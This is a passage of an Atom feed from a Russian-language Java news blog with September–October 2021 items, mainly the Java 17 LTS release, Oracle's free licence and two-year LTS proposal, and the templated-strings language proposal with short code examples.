&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://www.wildfly.org/news/2021/10/05/WildFly25-Final-Released/"&gt;WildFly 25&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://in.relation.to/2021/10/13/hibernate-orm-560-final/"&gt;Hibernate 5.6.0&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://github.com/google/guava/releases/tag/v31.0"&gt;Guava 31.0&lt;/a&gt; (и сразу же &lt;a href="https://github.com/google/guava/releases/tag/v31.0.1"&gt;31.0.1&lt;/a&gt; из-за проблемы с GWT).&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://github.com/mockito/mockito/releases/tag/v4.0.0"&gt;Mockito 4&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #28</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_28.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_28.html</id>
    <updated>2021-09-19T17:00:00Z</updated>
    <published>2021-09-19T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Главной новостью прошедшей недели стал &lt;a href="java_17.html"&gt;выход Java 17&lt;/a&gt;. Это следующая LTS-версия Java, которая вышла спустя 3 года после предыдущей &lt;a href="java_11_is_out.html"&gt;Java 11&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Но релиз Java 17 оказался не единственным большим событием. Сразу после того, как Oracle JDK 17 стал доступен для скачивания на сайте компании, Oracle опубликовал две важных новости.&lt;/p&gt;
&lt;p&gt;Во-первых, лицензия Oracle JDK &lt;a href="https://blogs.oracle.com/java/post/free-java-license"&gt;поменялась&lt;/a&gt; и вновь стала свободной, как это было &lt;a href="https://minijug.ru/no_more_free_oracle_jdk.html"&gt;до Java 11&lt;/a&gt;. Таким образом, сборку Oracle JDK 17 можно использовать бесплатно как в разработке, так и в продуктовом окружении в коммерческих целях. Такое решение было принято компанией в результате анализа обратной связи со стороны пользователей, которые приветствовали наличие сборок OpenJDK под GPL, но всё же хотели иметь &amp;laquo;проверенный и надёжный, как скала&amp;raquo;, образ Oracle JDK под однозначно бесплатной лицензией. Кроме того, было заявлено, что бесплатные &lt;a href="https://www.oracle.com/java/technologies/downloads/"&gt;обновления  Oracle JDK 17&lt;/a&gt; будут выходить как минимум до сентября 2024 года, то есть три года, а не полгода с момента выхода, как это было для Java 9-16. Что касается Oracle OpenJDK, то с ним всё остаётся &lt;a href="https://mail.openjdk.java.net/pipermail/discuss/2021-September/005949.html"&gt;без изменений&lt;/a&gt;: Oracle будет поддерживать OpenJDK первые полгода и выпустит, как обычно, только два обновления (17.0.1 и 17.0.2).&lt;/p&gt;
&lt;p&gt;Во-вторых, Oracle предложил &lt;a href="https://blogs.oracle.com/java/post/moving-the-jdk-to-a-two-year-lts-cadence"&gt;участить цикл&lt;/a&gt; выхода LTS-версий Java и выпускать LTS не каждые три года, а каждые два. Это значит, что согласно этому предложению следующей LTS-версией может стать Java 21, которая выйдет в 2023 году, а не Java 23. Такое изменение компания мотивирует тем, что несмотря на наличие предсказуемых шестимесячных релизов, многие предприятия всё же предпочитают использовать LTS и не спешат обновляться. Более короткий цикл мог бы дать компаниям мотивацию обновляться чаще и повысит привлекательность всех релизов, в том числе и не-LTS. Это в свою очередь даст ускорение всей экосистеме Java.&lt;/p&gt;
&lt;p&gt;Также Oracle запустил новый сайт &lt;a href="https://dev.java/"&gt;dev.java&lt;/a&gt;, в котором собраны полезные материалы для изучения Java, ссылки на новости и полезные ресурсы.&lt;/p&gt;
&lt;p class="pt-2"&gt;&amp;bull; Новости JEP'ов:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Java 18 пополнилась ещё одним JEP: &lt;a href="https://openjdk.java.net/jeps/417"&gt;Vector API (Third Incubator)&lt;/a&gt;. Теперь в Java 18 &lt;a href="http://openjdk.java.net/projects/jdk/18/"&gt;уже три JEP'а&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://openjdk.java.net/jeps/418"&gt;Internet-Address Resolution SPI&lt;/a&gt; перестал быть черновиком и стал кандидатом, получив номер 418. Про него мы писали в &lt;a href="java_news_24.html"&gt;выпуске #24&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Джим Ласки и Брайан Гётц &lt;a href="https://mail.openjdk.java.net/pipermail/amber-spec-experts/2021-September/003107.html"&gt;предложили&lt;/a&gt; рассмотреть идею новой языковой конструкции в Java: &lt;a href="https://github.com/openjdk/amber-docs/blob/master/site/design-notes/templated-strings.md"&gt;шаблонные строки&lt;/a&gt;. Шаблонные строки представляют собой улучшение и развитие идеи строковой интерполяции, которая есть в большинстве популярных языков программирования (C#, Kotlin, Scala, JavaScript и др).&lt;/p&gt;
&lt;p&gt;Главное отличие от простой строковой интерполяции &amp;ndash; это отделение механизма выражения шаблонной строки в языке от политики комбинирования строки и параметров. Например, все эти три примера используют один и тот же механизм:&lt;/p&gt;
&lt;pre&gt;String s = STR.&lt;span style="color: darkred"&gt;"Hello &lt;/span&gt;&lt;span style="color: darkblue"&gt;\{&lt;/span&gt;name&lt;span style="color: darkblue"&gt;}&lt;/span&gt;&lt;span style="color: darkred"&gt;, I am &lt;/span&gt;&lt;span style="color: darkblue"&gt;\{&lt;/span&gt;age&lt;span style="color: darkblue"&gt;}&lt;/span&gt;&lt;span style="color: darkred"&gt; years old"&lt;/span&gt;;&lt;/pre&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;var&lt;/span&gt; query = connection.&lt;span style="color: darkred"&gt;"SELECT * FROM &lt;/span&gt;&lt;span style="color: darkblue"&gt;\{&lt;/span&gt;table&lt;span style="color: darkblue"&gt;}&lt;/span&gt;&lt;span style="color: darkred"&gt;"&lt;/span&gt;;&lt;/pre&gt;
&lt;pre&gt;String message = resourceBundle.&lt;span style="color: darkred"&gt;"error: file &lt;/span&gt;&lt;span style="color: darkblue"&gt;\{&lt;/span&gt;filename&lt;span style="color: darkblue"&gt;}&lt;/span&gt;&lt;span style="color: darkred"&gt; not found"&lt;/span&gt;;&lt;/pre&gt;
&lt;p&gt;Но политика комбинирования шаблона и параметров совершенно разная, потому что каждый из объектов реализует интерфейс политики по-своему: &lt;code&gt;STR&lt;/code&gt; выполняет простую строковую конкатенацию, &lt;code&gt;connection&lt;/code&gt; создаёт объект запроса (который необязательно &lt;code&gt;String&lt;/code&gt;), выполняя валидацию и нормализацию, например, оборачивает имя таблицы в одинарные кавычки, а &lt;code&gt;resourceBundle&lt;/code&gt; пытается найти подходящую строку для текущей локали и форматирует сообщение по правилам &lt;code&gt;MessageFormat&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Таким образом, шаблонные строки не просто решают задачу интерполяции, а предоставляют гибкий и общий инструмент, дающий возможность библиотекам полностью контролировать весь процесс валидации, трансформации и комбинирования параметров со строкой.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://www.eclipse.org/eclipseide/2021-09/noteworthy/"&gt;Eclipse 2021-09&lt;/a&gt;. Среди улучшений более быстрый стартап IDE, функция Raw Paste, новый quick-fix для конвертации цикла &lt;code&gt;while&lt;/code&gt; в &lt;code&gt;do-while&lt;/code&gt;, дефолтные фильтры в Java &amp;#8594; Appearance &amp;#8594; Type Filters, улучшенный диалог сохранения нескольких файлов, улучшенная тёмная тема и другие. Встроенной поддержки Java 17 пока что нет, но она доступна в &lt;a href="https://marketplace.eclipse.org/content/java-17-support-eclipse-2021-09-421"&gt;Eclipse Marketplace&lt;/a&gt;. Более подробно про улучшения можно посмотреть в &lt;a href="https://www.youtube.com/watch?v=_OkIpz__Fyk"&gt;видео&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Роман Кеннке, лидер проекта Shenandoah в RedHat, рассказал, как им удалось достичь &lt;a href="https://developers.redhat.com/articles/2021/09/16/shenandoah-openjdk-17-sub-millisecond-gc-pauses"&gt;субмиллисекундных пауз&lt;/a&gt; сборщика мусора в Java 17. В этом им помогла &lt;a href="https://openjdk.java.net/jeps/376"&gt;конкурентная обработка стеков потоков&lt;/a&gt;, которая ранее была реализована для ZGC и также помогла значительно &lt;a href="https://malloc.se/blog/zgc-jdk16"&gt;снизить паузы&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://blog.jetbrains.com/idea/2021/09/java-annotated-monthly-september-2021/"&gt;Java Annotated Monthly&lt;/a&gt; от JetBrains за сентябрь 2021.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://gluonhq.com/products/javafx/openjfx-17-release-notes/"&gt;JavaFX 17&lt;/a&gt; с Long Term Support.&lt;/p&gt;</content>
  </entry>
</feed>
